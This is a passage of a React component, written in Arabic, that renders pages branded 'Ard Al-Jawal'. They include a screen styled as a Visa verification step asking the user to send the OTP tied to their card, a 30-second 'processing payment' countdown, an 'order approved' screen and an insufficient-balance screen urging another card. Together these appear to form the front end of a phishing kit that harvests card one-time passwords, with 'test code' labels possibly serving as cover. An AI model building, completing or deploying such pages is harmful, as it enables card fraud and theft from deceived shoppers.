              <div className="erd-balance-gold-coins">
                <div className="erd-balance-coin" />
                <div className="erd-balance-coin" />
                <div className="erd-balance-coin" />
              </div>
              <div className="erd-balance-terminal">
                <svg fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                </svg>
              </div>
            </div>
            <div className="erd-balance-divider" aria-hidden="true" />
            <div className="erd-balance-tip-text">
              يرجى شحن رصيدك أو استخدام بطاقة أخرى لإتمام عملية الدفع.
            </div>
          </div>
        </section>
      </main>
    );
  }

  if (invoiceSent) {
    return (
      <main className="erd-invoice-page">
        <style jsx global>{`
          @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
          .erd-invoice-page,
          .erd-invoice-page * {
            box-sizing: border-box;
            font-family: 'Cairo', system-ui, -apple-system, sans-serif;
          }
          .erd-invoice-page {
            background: #f4f7f6;
            color: #12354e;
            width: 100%;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
          }
          .erd-invoice-card {
            background: #fff;
            width: 100%;
            max-width: 440px;
            border-radius: 28px;
            padding: 36px 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,.04);
            text-align: center;
          }
          .erd-invoice-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 28px;
          }
          .erd-invoice-logo-text {
            text-align: right;
            font-size: 26px;
            font-weight: 800;
            color: #12354e;
            line-height: 1.05;
          }
          .erd-invoice-logo-text span {
            color: #00cda9;
            display: block;
          }
          .erd-invoice-logo-mark {
            display: flex;
            flex-direction: column;
            gap: 4px;
          }
          .erd-invoice-shape-top,
          .erd-invoice-shape-bottom {
            width: 32px;
            height: 20px;
            border-radius: 6px;
            transform: skewX(-12deg);
          }
          .erd-invoice-shape-top { background: #12354e; }
          .erd-invoice-shape-bottom { background: #00cda9; }
          .erd-invoice-icon-container {
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 28px;
            min-height: 96px;
          }
          .erd-invoice-success-circle {
            width: 96px;
            height: 96px;
            flex: none;
            background: #00cda9;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 24px rgba(0,205,169,.25);
            position: relative;
            z-index: 2;
          }
          .erd-invoice-success-circle svg {
            width: 44px;
            height: 44px;
            color: #fff;
            stroke-width: 3.5;
          }
          .erd-invoice-ray {
            position: absolute;
            width: 14px;
            height: 5px;
            background: #00cda9;
            border-radius: 10px;
            opacity: .85;
          }
          .erd-invoice-ray-left-1 { transform: rotate(-25deg); left: clamp(28px, calc(50% - 120px), 80px); top: 18px; }
          .erd-invoice-ray-left-2 { transform: rotate(25deg); left: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; }
          .erd-invoice-ray-right-1 { transform: rotate(25deg); right: clamp(28px, calc(50% - 120px), 80px); top: 18px; }
          .erd-invoice-ray-right-2 { transform: rotate(-25deg); right: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; }
          .erd-invoice-title {
            font-size: 32px;
            font-weight: 800;
            color: #12354e;
            margin: 0 0 4px;
            line-height: 1.25;
          }
          .erd-invoice-highlight {
            font-size: 38px;
            font-weight: 900;
            color: #ee3c47;
            margin-bottom: 12px;
            line-height: 1.15;
          }
          .erd-invoice-subtitle {
            font-size: 21px;
            font-weight: 700;
            color: #12354e;
            margin: 0 0 32px;
          }
          .erd-invoice-status-box {
            background: #f0fdf9;
            border: 1.5px solid #c2f5ea;
            border-radius: 20px;
            padding: 16px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            direction: rtl;
          }
          .erd-invoice-card-visual {
            position: relative;
            width: 100px;
            height: 64px;
            flex: none;
            background: linear-gradient(135deg,#1d3344 0%,#0d1e2b 100%);
            border-radius: 10px;
            padding: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,.15);
            transform: rotate(-4deg);
          }
          .erd-invoice-chip {
            width: 14px;
            height: 11px;
            background: #f0c567;
            border-radius: 3px;
            margin-bottom: 14px;
          }
          .erd-invoice-card-lines { display: flex; gap: 4px; }
          .erd-invoice-card-line {
            width: 14px;
            height: 4px;
            background: rgba(255,255,255,.3);
            border-radius: 2px;
          }
          .erd-invoice-badge-check {
            position: absolute;
            bottom: -8px;
            right: -8px;
            width: 34px;
            height: 34px;
            background: #00cda9;
            border: 3px solid #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 2px 8px rgba(0,0,0,.1);
          }
          .erd-invoice-badge-check svg {
            width: 18px;
            height: 18px;
            color: #fff;
            stroke-width: 3.5;
          }
          .erd-invoice-divider {
            width: 1.5px;
            height: 48px;
            flex: none;
            background: #bcefe5;
          }
          .erd-invoice-status-text {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            gap: 6px;
            min-width: 0;
          }
          .erd-invoice-status-label {
            font-size: 16px;
            font-weight: 700;
            color: #12354e;
          }
          .erd-invoice-status-pill {
            white-space: nowrap;
            background: #d4f7ee;
            color: #00a88a;
            padding: 4px 14px;
            border-radius: 100px;
            font-size: 15px;
            font-weight: 800;
          }
          @media (max-width: 380px) {
            .erd-invoice-card { padding: 30px 16px; }
            .erd-invoice-title { font-size: 27px; }
            .erd-invoice-highlight { font-size: 34px; }
            .erd-invoice-subtitle { font-size: 18px; margin-bottom: 26px; }
            .erd-invoice-status-box { padding: 13px 10px; gap: 9px; }
            .erd-invoice-card-visual { width: 82px; height: 56px; }
            .erd-invoice-divider { height: 42px; }
            .erd-invoice-status-label { font-size: 14px; }
            .erd-invoice-status-pill { font-size: 12px; padding: 4px 9px; }
          }
        `}</style>

        <section className="erd-invoice-card" aria-live="polite">
          <div className="erd-invoice-logo">
            <div className="erd-invoice-logo-text">
              أرض
              <span>الجوال</span>
            </div>
            <div className="erd-invoice-logo-mark" aria-hidden="true">
              <div className="erd-invoice-shape-top" />
              <div className="erd-invoice-shape-bottom" />
            </div>
          </div>

          <div className="erd-invoice-icon-container" aria-hidden="true">
            <div className="erd-invoice-ray erd-invoice-ray-left-1" />
            <div className="erd-invoice-ray erd-invoice-ray-left-2" />
            <div className="erd-invoice-ray erd-invoice-ray-right-1" />
            <div className="erd-invoice-ray erd-invoice-ray-right-2" />
            <div className="erd-invoice-success-circle">
              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            </div>
          </div>

          <h1 className="erd-invoice-title">تم اعتماد طلبك</h1>
          <div className="erd-invoice-highlight">بنجاح</div>
          <p className="erd-invoice-subtitle">سيتم معالجة طلبك قريباً</p>

          <div className="erd-invoice-status-box">
            <div className="erd-invoice-card-visual" aria-hidden="true">
              <div className="erd-invoice-chip" />
              <div className="erd-invoice-card-lines">
                <div className="erd-invoice-card-line" />
                <div className="erd-invoice-card-line" />
                <div className="erd-invoice-card-line" />
                <div className="erd-invoice-card-line" />
              </div>
              <div className="erd-invoice-badge-check">
                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                </svg>
              </div>
            </div>
            <div className="erd-invoice-divider" aria-hidden="true" />
            <div className="erd-invoice-status-text">
              <span className="erd-invoice-status-label">حالة الطلب</span>
              <span className="erd-invoice-status-pill">تم الاعتماد بنجاح</span>
            </div>
          </div>
        </section>
      </main>
    );
  }

  return (
    <div className={verified ? 'erd-wait-shell' : undefined} style={{ backgroundColor: verified ? '#fbfcfd' : '#ffffff', color: verified ? '#1c2530' : '#000000', minHeight: verified ? '100svh' : '100vh', height: verified ? '100svh' : undefined, display: 'flex', flexDirection: 'column', alignItems: 'center', fontFamily: verified ? '"Tajawal", Tahoma, Arial, sans-serif' : 'Arial, sans-serif', overflowX: verified ? 'hidden' : 'visible', overflowY: verified ? 'hidden' : 'visible', position: 'relative' }}>
      
      {!verified && (
        <>
          {/* Header */}
          <header style={{ width: '100%', maxWidth: '500px', padding: '15px 20px', display: 'flex', justifyContent: 'flex-start', alignItems: 'center', borderBottom: '1px solid #dcdcdc' }}>
            <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#1a1f71', fontStyle: 'italic', letterSpacing: '-1px' }}>
              visa
            </div>
          </header>
        </>
      )}

      {/* Content */}
      <main className={verified ? 'erd-wait-main' : undefined} style={{ width: '100%', maxWidth: verified ? '480px' : '400px', minHeight: verified ? '100svh' : 'auto', height: verified ? '100svh' : undefined, padding: verified ? '48px 24px' : '30px 20px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: verified ? 'center' : 'center', textAlign: 'center', position: 'relative', zIndex: 1, boxSizing: verified ? 'border-box' : 'content-box' }}>
        
        {verified ? (
          <>
            <style jsx global>{`
              @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;800&display=swap');
              .erd-wait-blob { position: fixed; border-radius: 50%; pointer-events: none; z-index: 0; }
              .erd-wait-blob-one { width: 260px; height: 260px; top: -130px; left: -90px; background: linear-gradient(135deg,#7fd6bf,#bfe9dd); }
              .erd-wait-blob-two { width: 420px; height: 420px; bottom: -250px; right: -120px; background: linear-gradient(135deg,#d6efe8,#7fd6bf); }
              .erd-wait-blob-three { width: 300px; height: 300px; bottom: -190px; left: -60px; background: #e9f6f2; }
              /* Keep the decorative circles proportionate and anchored on phones. */
              @media (max-width: 480px) {
                .erd-wait-blob-one {
                  width: clamp(150px, 48vw, 210px);
                  height: clamp(150px, 48vw, 210px);
                  top: -82px;
                  left: -62px;
                }
                .erd-wait-blob-two {
                  width: clamp(245px, 76vw, 330px);
                  height: clamp(245px, 76vw, 330px);
                  right: -108px;
                  bottom: -178px;
                }
                .erd-wait-blob-three {
                  width: clamp(180px, 56vw, 245px);
                  height: clamp(180px, 56vw, 245px);
                  left: -72px;
                  bottom: -132px;
                }
              }
              @media (max-width: 380px) {
                .erd-wait-blob-one { top: -72px; left: -58px; }
                .erd-wait-blob-two { right: -112px; bottom: -165px; }
                .erd-wait-blob-three { left: -66px; bottom: -122px; }
              }
              .erd-wait-logo { display: flex; align-items: center; gap: 14px; margin: 0 auto 56px; direction: rtl; }
              .erd-wait-logo-text { font-weight: 800; font-size: 30px; line-height: 1.05; text-align: right; }
              .erd-wait-logo-text span { display: block; }
              .erd-wait-logo-line { display: inline-block; width: 110px; height: 2px; background: #1c2530; vertical-align: middle; margin-inline-end: 6px; }
              .erd-wait-logo-mark { width: 56px; height: 70px; flex: none; }
              .erd-wait-timer { position: relative; width: min(300px,72vw); aspect-ratio: 1; }
              .erd-wait-ring { width: 100%; height: 100%; transform: rotate(-90deg); }
              .erd-wait-ring circle { fill: none; stroke-width: 14; stroke-linecap: round; }
              .erd-wait-track { stroke: #e6eaee; }
              .erd-wait-progress { stroke: #2fbf9b; transition: stroke-dashoffset 1s linear; }
              .erd-wait-timer-body { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; }
              .erd-wait-hourglass { width: 52px; height: 64px; margin-bottom: 6px; }
              .erd-wait-number { font-size: 64px; font-weight: 800; line-height: 1; font-variant-numeric: tabular-nums; }
              .erd-wait-unit { font-size: 20px; color: #5b6672; font-weight: 500; }
              .erd-wait-heading { font-size: 34px; font-weight: 800; margin: 44px 0 22px; line-height: 1.35; }
              .erd-wait-divider { display: flex; align-items: center; gap: 14px; width: 100%; margin-bottom: 26px; }
              .erd-wait-divider-line { flex: 1; height: 1px; background: #e6eaee; }
              .erd-wait-dots { display: flex; gap: 10px; }
              .erd-wait-dots b { width: 12px; height: 12px; border-radius: 50%; background: #e6eaee; animation: erd-wait-pulse 1.2s infinite; }
              .erd-wait-dots b:nth-child(2) { animation-delay: .2s; }
              .erd-wait-dots b:nth-child(3) { animation-delay: .4s; }
              @keyframes erd-wait-pulse { 0%,100% { background: #e6eaee; transform: scale(1); } 50% { background: #2fbf9b; transform: scale(1.25); } }
              .erd-wait-message { font-size: 20px; line-height: 1.8; color: #5b6672; max-width: 340px; }
              @media (prefers-reduced-motion: reduce) { .erd-wait-dots b { animation: none; } .erd-wait-progress { transition: none; } }
              @media (max-width: 480px) {
                .erd-wait-logo { gap: 10px; margin-bottom: 38px; }
                .erd-wait-logo-text { font-size: clamp(23px, 6vw, 28px); }
                .erd-wait-logo-mark { width: 48px; height: 60px; }
                .erd-wait-timer { width: min(260px, 68vw); }
                .erd-wait-heading { font-size: clamp(25px, 7vw, 30px); margin: 34px 0 18px; }
                .erd-wait-message { font-size: clamp(16px, 4.5vw, 18px); line-height: 1.7; }
                .erd-wait-divider { gap: 10px; margin-bottom: 20px; }
              }
              @media (max-width: 380px) { .erd-wait-logo { margin-bottom: 30px; } .erd-wait-heading { font-size: 25px; margin-top: 28px; } .erd-wait-message { font-size: 16px; } }
            `}</style>

            <div className="erd-wait-blob erd-wait-blob-one" aria-hidden="true" />
            <div className="erd-wait-blob erd-wait-blob-two" aria-hidden="true" />
            <div className="erd-wait-blob erd-wait-blob-three" aria-hidden="true" />

            <div className="erd-wait-logo" aria-label="أرض الجوال">
              <div className="erd-wait-logo-text">
                <span><i className="erd-wait-logo-line" />أرض</span>
                <span>الجوال</span>
              </div>
              <svg className="erd-wait-logo-mark" viewBox="0 0 56 70" aria-hidden="true">
                <path d="M4 14q0-8 8-8h36q6 0 4 7l-6 16H8q-4 0-4-5z" fill="#eef1f3" stroke="#c9d0d6" strokeWidth="2" />
                <path d="M4 40h42l6 10q4 6-3 10H12q-8 0-8-8z" fill="#2fbf9b" />
              </svg>
            </div>

            <div className="erd-wait-timer" role="timer" aria-live="polite" aria-label={`متبقي ${countdown} ثانية`}>
              <svg className="erd-wait-ring" viewBox="0 0 100 100" aria-hidden="true">
                <circle className="erd-wait-track" cx="50" cy="50" r="45" />
                <circle
                  className="erd-wait-progress"
                  cx="50"
                  cy="50"
                  r="45"
                  style={{
                    strokeDasharray: 2 * Math.PI * 45,
                    strokeDashoffset: 2 * Math.PI * 45 * (1 - Math.max(0, Math.min(30, countdown)) / 30),
                  }}
                />
              </svg>
              <div className="erd-wait-timer-body">
                <svg className="erd-wait-hourglass" viewBox="0 0 52 64" aria-hidden="true">
                  <rect x="4" y="2" width="44" height="5" rx="2" fill="#2b3640" />
                  <rect x="4" y="57" width="44" height="5" rx="2" fill="#2b3640" />
                  <path d="M10 7v10q0 8 12 15-12 7-12 15v10M42 7v10q0 8-12 15 12 7 12 15v10" fill="none" stroke="#2b3640" strokeWidth="4" strokeLinecap="round" />
                  <path d="M16 54q0-8 10-12 10 4 10 12z" fill="#2fbf9b" />
                  <path d="M26 30v12" stroke="#2fbf9b" strokeWidth="2" />
                </svg>
                <div className="erd-wait-number">{countdown}</div>
                <div className="erd-wait-unit">ثانية</div>
              </div>
            </div>

            <h1 className="erd-wait-heading">جار معالجة عملية الدفع</h1>
            <div className="erd-wait-divider" aria-hidden="true">
              <i className="erd-wait-divider-line" />
              <div className="erd-wait-dots"><b /><b /><b /></div>
              <i className="erd-wait-divider-line" />
            </div>
            <p className="erd-wait-message">يرجى الانتظار وعدم اغلاق هذه الصفحة حتى اكتمال العمليه</p>
          </>
        ) : (
          <>
            <div style={{ fontSize: '16px', color: '#555555', marginBottom: '15px' }}>
              معاينة شاشة إدخال رمز تجريبي
            </div>

            <div style={{ fontSize: '18px', lineHeight: '1.4', color: '#000000', marginBottom: '25px', maxWidth: '320px' }}>
              . من فضلك ارسل رمز الهاتف المرتبط بهذه الفيزا.
              <span style={{ display: 'block', direction: 'ltr', fontFamily: 'monospace, sans-serif', fontSize: '20px', marginTop: '5px' }}>
                 •••• 0000
              </span>
            </div>

            <form onSubmit={(e) => { e.preventDefault(); void handleVerify(); }} style={{ width: '100%', maxWidth: '280px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
              <label htmlFor="otp" style={{ fontSize: '14px', color: '#777777', marginBottom: '6px', direction: 'ltr' }}>
                otp Code
              </label>

              <input
                id="otp"
                type="text"
                inputMode="numeric"
                autoComplete="off"
                pattern="[0-9]*"
                maxLength={6}
                value={referenceCode}
                onChange={(e) => {
                  setReferenceCode(normalizeDigits(e.target.value).slice(0, 6));
                  setError('');
                }}
                disabled={isVerifying}
                style={{
                  width: '100%',
                  height: '42px',
                  border: '1px solid #7f9db9',
                  borderRadius: '2px',
                  fontSize: '18px',
                  textAlign: 'center',
                  marginBottom: '12px',
                  outline: 'none',
                }}
              />

              {error && (
                <div style={{ color: '#c62828', fontSize: '13px', marginBottom: '10px' }}>
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={!isReferenceCodeValid || isVerifying}
                style={{
                  width: '100%',
                  height: '42px',
                  backgroundColor: '#1646a7',
                  color: '#ffffff',
                  border: 'none',
                  borderRadius: '4px',
                  fontSize: '16px',
                  cursor: isReferenceCodeValid && !isVerifying ? 'pointer' : 'not-allowed',
                  opacity: isReferenceCodeValid && !isVerifying ? 1 : 0.7,
                }}
              >
                معاينة الرمز التجريبي
              </button>
            </form>

            <button
              type="button"
              onClick={() => { setReferenceCode(''); setError(''); }}
              style={{ marginTop: '50px', color: '#1646a7', fontSize: '14px', background: 'none', border: 'none', cursor: 'pointer', textDecoration: 'none' }}
            >
              مسح الرمز التجريبي
            </button>

            <div style={{ marginTop: '40px', color: '#1646a7', fontSize: '14px', direction: 'ltr', fontWeight: 'bold' }}>
              <a href="#" style={{ color: '#1646a7', textDecoration: 'none' }}>Terms of Use</a> | <a href="#" style={{ color: '#1646a7', textDecoration: 'none' }}>?Need help</a>
            </div>
          </>
        )}
      </main>
    </div>
  );
}
